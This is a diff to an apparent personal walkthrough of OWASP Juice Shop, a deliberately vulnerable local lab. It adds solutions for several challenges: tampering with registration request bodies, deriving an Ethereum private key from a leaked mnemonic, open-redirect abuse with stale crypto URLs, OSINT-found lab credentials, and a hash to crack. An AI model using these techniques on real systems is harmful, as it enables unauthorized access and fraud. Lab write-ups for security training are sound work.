@@ -27,6 +27,10 @@ Solved so far:
 | DOM XSS | XSS | Injected the iframe JavaScript payload into the vulnerable frontend route and triggered the challenge notification. |
 | Mass Dispel | Miscellaneous | Restarted the server to recreate multiple challenge notifications, then used the notification convenience close-all behavior. |
 | Reset Morty's Password | Broken Anti Automation | Used Morty's obfuscated favorite pet answer instead of SQL injection. |
+| NFT Takeover | Sensitive Data Exposure | Used the leaked mnemonic from feedback to derive the first Ethereum private key and authenticate at `/#/juicy-nft`. |
+| Outdated Allowlist | Unvalidated Redirects | Found stale crypto donation addresses in compiled frontend JavaScript and routed one through `/redirect?to=...`. |
+| Repetitive Registration | Improper Input Validation | Bypassed frontend validation and registered with an empty/different repeat-password value. |
+| Login MC SafeSearch | Sensitive Data Exposure | Used the OSINT password clue from MC SafeSearch's video. |
 
 ## Reconnaissance
 
@@ -509,6 +513,98 @@ If the endpoint blocks repeated attempts, rotate the test IP header in Burp:
 X-Forwarded-For: 127.0.0.123
 ```
 
+## Registration Validation Bypass
+
+The Repetitive Registration challenge is not solved by using an invalid email such as:
+
+```text
+Test@@juice-sh.op
+```
+
+That is blocked because the email format is invalid. The useful target is the repeated password field.
+
+Frontend behavior observed:
+
+```text
+Email: test123@juice-sh.op
+Password: Please provide a password.
+Repeat Password: Please repeat your password.
+Passwords do not match
+Security Question: Mother's maiden name?
+Answer: test
+```
+
+The challenge hint says to register with either an empty or different value in the Repeat Password field. The browser UI prevents that, so use Burp to intercept a normal registration request, send it to Repeater, and modify only the repeat password value.
+
+Example original request body:
+
+```json
+{
+  "email": "test123@juice-sh.op",
+  "password": "Admin1!!",
+  "passwordRepeat": "Admin1!!",
+  "securityQuestion": {
+    "id": 1,
+    "question": "Mother's maiden name?"
+  },
+  "securityAnswer": "test"
+}
+```
+
+Modified body:
+
+```json
+{
+  "email": "test123@juice-sh.op",
+  "password": "Admin1!!",
+  "passwordRepeat": "",
+  "securityQuestion": {
+    "id": 1,
+    "question": "Mother's maiden name?"
+  },
+  "securityAnswer": "test"
+}
+```
+
+The same idea works if the frontend uses a different repeat-password key name. Keep the real password set and make the repeat value empty or different.
+
+## Login MC SafeSearch
+
+The failed login attempt used the wrong account and password:
+
+```json
+{
+  "email": "mcsafesproduction@juice-sh.op",
+  "password": "N3wPassword"
+}
+```
+
+The correct Juice Shop account is:
+
+```text
+mc.safesearch@juice-sh.op
+```
+
+The OSINT clue is from MC SafeSearch's password video: the password is based on the dog name "Mr. Noodles" with some vowels changed into zeroes.
+
+Working credentials:
+
+```text
+Email: mc.safesearch@juice-sh.op
+Password: Mr. N00dles
+```
+
+Burp/API login body:
+
+```json
+{
+  "email": "mc.safesearch@juice-sh.op",
+  "password": "Mr. N00dles"
+}
+```
+
+Important detail: `N00dles` uses two zeroes and the password includes a space after `Mr.`.
+
 ## Notifications and Mass Dispel
 
 Challenge-solved notifications are client-side UI elements that appear when a challenge transitions from unsolved to solved. Replaying the same API request in Burp does not reliably recreate a solved notification once the challenge is already marked solved.
@@ -546,29 +642,73 @@ Ctrl+C
 npm start
 ```
 
-## Web3 Wallet Setup
+## Web3 and NFT Takeover
 
-The Web3 challenges require a browser wallet such as MetaMask. Install the extension from:
-
-```text
-https://metamask.io/download/
-```
-
-Then refresh:
+The `/juicy-nft` route does not require setting up MetaMask for this challenge path. The page asks for an Ethereum private key:
 
 ```text
-http://localhost:3000
+http://localhost:3000/#/juicy-nft
 ```
 
-When Juice Shop prompts for wallet access, approve the MetaMask connection for the local lab.
-
-NFT clue captured from feedback:
+The feedback API leaked this mnemonic phrase:
 
 ```text
 purpose betray marriage blame crunch monitor spin slide donate sport lift clutch
 ```
 
-Use this only inside the local Juice Shop lab. It appears connected to `/juicy-nft` and the NFT/Web3 challenge path.
+Derive the first MetaMask-style Ethereum account from the mnemonic:
+
+```text
+Path: m/44'/60'/0'/0/0
+```
+
+Derived private key used to solve the NFT page:
+
+```text
+0x5bcc3e9d38baa06e7bfaab80ae5957bbe8ef059e640311d7d6d465e6bc948e3e
+```
+
+Use this only inside the local Juice Shop lab.
+
+## Outdated Allowlist
+
+The challenge hint says the developers removed references to old crypto addresses sloppily, and the Angular compiler did not remove them. The stale addresses are visible in the compiled frontend bundle.
+
+Search the frontend JavaScript:
+
+```powershell
+$files=@('main.js','scripts.js','chunk-24EZLZ4I.js','chunk-T3PSKZ45.js','chunk-4MIYPPGW.js','chunk-LHKS7QUN.js','chunk-TWZW5B45.js')
+foreach($f in $files){
+  $c=(Invoke-WebRequest -UseBasicParsing "http://localhost:3000/$f").Content
+  [regex]::Matches($c,'https?://[^"''`<>\\) ]+') |
+    ForEach-Object {
+      if ($_.Value -match 'blockchain|dash|ether|crypto') {
+        "${f}: $($_.Value)"
+      }
+    }
+}
+```
+
+Found stale crypto addresses:
+
+```text
+https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm
+https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW
+https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6
+```
+
+It is not enough to open one of those external links directly. The vulnerable behavior is Juice Shop redirecting through its own endpoint:
+
+```text
+http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm
+```
+
+Fallback URLs to test:
+
+```text
+http://localhost:3000/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW
+http://localhost:3000/redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6
+```
 
 ## File Upload Lead
 
@@ -616,7 +756,7 @@ Good next challenges to target:
 | Zero Stars | Input validation on feedback rating. |
 | Bonus Payload | Builds directly on the confirmed DOM XSS search route. |
 | API-only XSS | Feedback API payload submission path is already captured in Burp. |
-| NFT Takeover | Feedback API leaked a mnemonic phrase and `/juicy-nft` route clue. |
+| Password Hash Leak | JWT/API responses already exposed admin password hash material. |
 
 ## Evidence Log
 
@@ -636,6 +776,10 @@ Good next challenges to target:
 | EVID-012 | 2026-05-04 | Morty password reset answer | API/Burp | `POST /rest/user/reset-password` with answer `5N0wb41L` |
 | EVID-013 | 2026-05-04 | Notification behavior | Browser DevTools | DOM XSS solved notification inspected as Angular Material `mat-card` |
 | EVID-014 | 2026-05-04 | Web3 NFT clue | Feedback API | Seed phrase and `/juicy-nft` route found in feedback record |
+| EVID-015 | 2026-05-04 | NFT private key derivation | Node.js | Derived `m/44'/60'/0'/0/0` private key from leaked mnemonic |
+| EVID-016 | 2026-05-04 | Outdated Allowlist addresses | Frontend JS | `main.js` contained stale blockchain/dash/etherscan addresses |
+| EVID-017 | 2026-05-04 | Repetitive Registration bypass | Burp | Changed `passwordRepeat` to empty/different in registration request |
+| EVID-018 | 2026-05-04 | MC SafeSearch credentials | OSINT/Login | `mc.safesearch@juice-sh.op` / `Mr. N00dles` |
 
 ## Rough Notes
 
@@ -647,3 +791,5 @@ Good next challenges to target:
 - Upload functionality should be inspected with Burp before assuming it can lead to command execution.
 - Authenticated API replay may require the `Authorization: Bearer <jwt>` header even when the browser also has a token cookie.
 - Possible admin password hash to crack: `0192023a7bbd73250516f069df18b500`.
+- The NFT page accepted a derived Ethereum private key, not a MetaMask wallet connection.
+- Outdated crypto-address links must be visited through `/redirect?to=...`, not directly.
